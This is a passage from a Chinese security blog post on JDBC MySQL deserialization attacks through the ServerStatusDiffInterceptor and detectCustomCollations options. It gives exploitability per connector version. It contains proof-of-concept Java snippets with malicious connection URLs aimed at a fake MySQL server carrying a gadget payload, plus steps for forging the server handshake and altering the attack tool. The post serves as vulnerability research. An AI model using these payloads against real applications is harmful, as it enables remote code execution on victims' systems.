+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;jdbc:mysql://ip:port/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=base64ZGVzZXJfQ0MzMV9jYWxj&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">String</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;base64ZGVzZXJfQ0MzMV9jYWxj&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">String</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;com.mysql.cj.jdbc.Driver&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DriverManager</span><span class="p">.</span><span class="na">getConnection</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="k">while</span><span class="p">(</span><span class="n">rs</span><span class="p">.</span><span class="na">next</span><span class="p">()){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">rs</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&#34;username&#34;</span><span class="p">)</span><span class="o">+</span><span class="s">&#34; : &#34;</span><span class="o">+</span><span class="n">rs</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&#34;password&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span></span></span></code></pre></div><p>这里我调试了一下，在5.1.2版本为例，这里初始化<code>initializeStatementInterceptors</code>​的过被放到了createNewIO里面，就导致了内置的SQL语句&ndash;SetAutoCommit执行时就不会调用到<code>Interceptors</code>​的逻辑。</p>
+<p><img loading="lazy" src="/assets/image-20240808152223-4e5adzb.png" alt="image" srcset="/assets/image-20240808152223-4e5adzb.png?size=small, /assets/image-20240808152223-4e5adzb.png?size=medium 1.5x, /assets/image-20240808152223-4e5adzb.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>之后再调用<code>ResultSet rs=statement.executeQuery(&quot;select * from users&quot;);</code>​的时候，由于statement的executeQuery方法是调用到了ConnectionImpl的executeqeuery方法，在执行的过程中，调用到MysqlIO的时候，会判断this.statementInterceptors是否存在，如果存在才会去调用其preProcess</p>
+<p><img loading="lazy" src="/assets/image-20240808153720-1bmxl1u.png" alt="image" srcset="/assets/image-20240808153720-1bmxl1u.png?size=small, /assets/image-20240808153720-1bmxl1u.png?size=medium 1.5x, /assets/image-20240808153720-1bmxl1u.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>所以理论上，只要我们在初始化ConnectionImpl的时候指定了Interceptor的话，之后利用ConnectionImpl进行SQL执行，并且将结果都，都会触发我们的反序列化。所以总的来说，ServerStatusDiffInterceptor的方式是利用了ConnectionImpl在初始化的时候，接受了不受信任的Interceptor进行初始化，并且也接受了不受信任的Mysql地址，进而造成了查询结果的反序列化。</p>
+<p>然后利用的话也需要目标环境具有对应的依赖才能顺利执行。</p>
+<p>总结下来Mysql的认证过程需要下面这几个部分我们来伪造：</p>
+<ol>
+<li>Greeting信息需要我们主动发送</li>
+<li>Greeting认证成功之后，发送OK package。客户端发送连接插件信息，也就是<code>mysql-connector-java</code>​的版本信息等</li>
+<li>伪造对应的信息：<code>max_allowed_packet</code>​ <code>system_time_zone</code>​等，并且发送</li>
+<li>客户端发送<code>SHOW SESSION STATUS</code>​信息，伪造对应的结果集数据包，然后发送</li>
+</ol>
+<p>‍</p>
+<h2 id="detectcustomcollations" class="heading-element"><span>detectCustomCollations</span>
+  <a href="#detectcustomcollations" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>此时的Mysql-JDBC版本是6.0.3，属于可干范围。</p>
+<h3 id="漏洞流程解析" class="heading-element"><span>漏洞流程解析</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e6%b5%81%e7%a8%8b%e8%a7%a3%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>流程还是比较简单的，跟Interceptor的利用有着异曲同工之妙，都是请求获取数据之后，在本地对结果进行反序列化</p>
+<p>正常走流程，直接跟进到ConnectionImpl的初始化逻辑，并且走进熟悉的createIO方法，一路跟进到connectOneTryOnly方法，也就是和服务端建立通信连接并且执行几句SQL获取服务端的配置信息之后，继续跟进<code>initializePropsFromServer()</code>​方法</p>
+<p><img loading="lazy" src="/assets/image-20240808163721-z4pbfw0.png" alt="image" srcset="/assets/image-20240808163721-z4pbfw0.png?size=small, /assets/image-20240808163721-z4pbfw0.png?size=medium 1.5x, /assets/image-20240808163721-z4pbfw0.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>来到buildCollationMapping</p>
+<p><img loading="lazy" src="/assets/image-20240808163939-2tle5v8.png" alt="image" srcset="/assets/image-20240808163939-2tle5v8.png?size=small, /assets/image-20240808163939-2tle5v8.png?size=medium 1.5x, /assets/image-20240808163939-2tle5v8.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>又发现了熟悉的resultSetToMap了，但是前面我们还不能高兴的太早，依然是检查我们JDBC连接启动项中detectCustomCollations是否为true，为true才会进入后续的反序列化操作。</p>
+<p><img loading="lazy" src="/assets/image-20240808165150-niu504y.png" alt="image" srcset="/assets/image-20240808165150-niu504y.png?size=small, /assets/image-20240808165150-niu504y.png?size=medium 1.5x, /assets/image-20240808165150-niu504y.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>‍</p>
+<h3 id="利用总结-1" class="heading-element"><span>利用总结</span>
+  <a href="#%e5%88%a9%e7%94%a8%e6%80%bb%e7%bb%93-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>detectCustomCollations的利用在于版本的限制比较多</p>
+<h4 id="602-606-1" class="heading-element"><span>6.0.2-6.0.6</span>
+  <a href="#602-606-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>没什么限制的一段版本，直接打就行</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">Driver</span><span class="o">=</span><span class="s">&#34;com.mysql.jdbc.Driver&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="n">Driver</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//连接的访问路径</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">url</span><span class="o">=</span><span class="s">&#34;jdbc:mysql://127.0.0.1:24730/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=base64ZGVzZXJfQ0MzMV9jYWxj&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//进行连接</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Connection</span><span class="w"> </span><span class="n">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DriverManager</span><span class="p">.</span><span class="na">getConnection</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="s">&#34;base64ZGVzZXJfQ0MzMV9jYWxj&#34;</span><span class="p">,</span><span class="s">&#34;123456&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Statement</span><span class="w"> </span><span class="n">statement</span><span class="o">=</span><span class="n">conn</span><span class="p">.</span><span class="na">createStatement</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ResultSet</span><span class="w"> </span><span class="n">rs</span><span class="o">=</span><span class="n">statement</span><span class="p">.</span><span class="na">executeQuery</span><span class="p">(</span><span class="s">&#34;select * from users&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">while</span><span class="p">(</span><span class="n">rs</span><span class="p">.</span><span class="na">next</span><span class="p">()){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">rs</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&#34;username&#34;</span><span class="p">)</span><span class="o">+</span><span class="s">&#34; : &#34;</span><span class="o">+</span><span class="n">rs</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&#34;password&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span></span></span></code></pre></div><h4 id="5141-5148" class="heading-element"><span>5.1.41-5.1.48</span>
+  <a href="#5141-5148" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>这个版本段也是可以打的，但是问题是他只会对结果集种的第三行数据进行getObject的反序列化操作</p>
+<p><img loading="lazy" src="/assets/image-20240808174635-blin04r.png" alt="image" srcset="/assets/image-20240808174635-blin04r.png?size=small, /assets/image-20240808174635-blin04r.png?size=medium 1.5x, /assets/image-20240808174635-blin04r.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p><img loading="lazy" src="/assets/image-20240808174351-utgwpkn.png" alt="image" srcset="/assets/image-20240808174351-utgwpkn.png?size=small, /assets/image-20240808174351-utgwpkn.png?size=medium 1.5x, /assets/image-20240808174351-utgwpkn.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>需要我们小改一下工具,许少之前已经写的差不多了，最后gadget写序列化数据的时候，3段行结果中，第三段是222的字节信息，转化过后是 <code>03 32 32 32</code>​，也就是222的16进制形式和其长度。这里我们为了兼容5.1.41-5.1.48的状况，只需要将结果集中第三行的数据改成data就行，这里的data就是序列化的payload</p>
+<p><img loading="lazy" src="/assets/image-20240808203728-79hrtvx.png" alt="image" srcset="/assets/image-20240808203728-79hrtvx.png?size=small, /assets/image-20240808203728-79hrtvx.png?size=medium 1.5x, /assets/image-20240808203728-79hrtvx.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>修改如下,重新打个jar包运行或者直接源码启动都可以。</p>
+<p><img loading="lazy" src="/assets/image-20240808203922-xt6zhmt.png" alt="image" srcset="/assets/image-20240808203922-xt6zhmt.png?size=small, /assets/image-20240808203922-xt6zhmt.png?size=medium 1.5x, /assets/image-20240808203922-xt6zhmt.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<h4 id="5129-5140" class="heading-element"><span>5.1.29-5.1.40</span>
+  <a href="#5129-5140" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>很奇怪的版本划分，只有5.1.41部分是将返回结果集的第三列数据进行反序列化操作，其他版本都是全部采用反序列化，跟6.0.2-6.0.6没有区别</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">Driver</span><span class="o">=</span><span class="s">&#34;com.mysql.jdbc.Driver&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="n">Driver</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//连接的访问路径</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">url</span><span class="o">=</span><span class="s">&#34;jdbc:mysql://127.0.0.1:24730/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=base64ZGVzZXJfQ0MzMV9jYWxj&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//进行连接</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Connection</span><span class="w"> </span><span class="n">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DriverManager</span><span class="p">.</span><span class="na">getConnection</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="s">&#34;base64ZGVzZXJfQ0MzMV9jYWxj&#34;</span><span class="p">,</span><span class="s">&#34;123456&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Statement</span><span class="w"> </span><span class="n">statement</span><span class="o">=</span><span class="n">conn</span><span class="p">.</span><span class="na">createStatement</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ResultSet</span><span class="w"> </span><span class="n">rs</span><span class="o">=</span><span class="n">statement</span><span class="p">.</span><span class="na">executeQuery</span><span class="p">(</span><span class="s">&#34;select * from users&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">while</span><span class="p">(</span><span class="n">rs</span><span class="p">.</span><span class="na">next</span><span class="p">()){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">rs</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&#34;username&#34;</span><span class="p">)</span><span class="o">+</span><span class="s">&#34; : &#34;</span><span class="o">+</span><span class="n">rs</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&#34;password&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span></span></span></code></pre></div><h4 id="5119-5128" class="heading-element"><span>5.1.19-5.1.28</span>
+  <a href="#5119-5128" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>在这个版本区间中就不会检查<code>detectCustomCollations=true</code>​的选项了，但是有个最低版本限制，这肯定能过，因为最低版本限制为5.0.0，所以之前的payload甚至都不用改，只是需要加上<code>autoDeserialize</code>​的选项即可。</p>
+<p><img loading="lazy" src="/assets/image-20240809092922-g1swa8x.png" alt="image" srcset="/assets/image-20240809092922-g1swa8x.png?size=small, /assets/image-20240809092922-g1swa8x.png?size=medium 1.5x, /assets/image-20240809092922-g1swa8x.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>其他版本，8往上，以及5.1.19往下，由于buildCollationMapping方法中不再调用resultSetToMap方法，所以不再存在利用途径。</p>
+<p><img loading="lazy" src="/assets/image-20240809100653-g4o2s96.png" alt="image" srcset="/assets/image-20240809100653-g4o2s96.png?size=small, /assets/image-20240809100653-g4o2s96.png?size=medium 1.5x, /assets/image-20240809100653-g4o2s96.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2024-08-08 15:58:26">更新于 2024-08-08&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="分享到 X" data-sharer="twitter" data-url="http://localhost:1313/posts/jdbc-mysql%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-title="JDBC-Mysql反序列化" data-hashtags="JDBC"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/jdbc-mysql%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-hashtag="JDBC"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/jdbc-mysql%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-title="JDBC-Mysql反序列化"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/jdbc/" class="post-tag" title="标签 - JDBC">JDBC</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/memshell%E5%86%8D%E7%A0%94%E7%A9%B6/" class="post-nav-item" rel="prev" title="Memshell再研究"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Memshell再研究</a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.131.0"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.10-51d64cb1"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="https://github.com/Stoocea"target="_blank" rel="external nofollow noopener noreferrer">stoocea</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/algoliasearch/algoliasearch-lite.umd.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 